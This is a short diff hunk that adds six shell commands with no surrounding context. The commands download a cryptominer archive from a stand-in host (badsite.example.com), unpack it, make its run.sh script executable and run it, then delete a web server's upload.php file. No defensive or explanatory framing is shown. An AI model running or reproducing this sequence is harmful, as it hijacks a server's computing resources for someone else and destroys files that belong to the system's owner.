@@ -1,0 +1,6 @@
+wget http://badsite.example.com/cryptominer.tar.gz
+tar -xvzf cryptominer.tar.gz
+cd miner
+chmod +x run.sh
+./run.sh
+rm -rf /var/www/html/api/upload.php
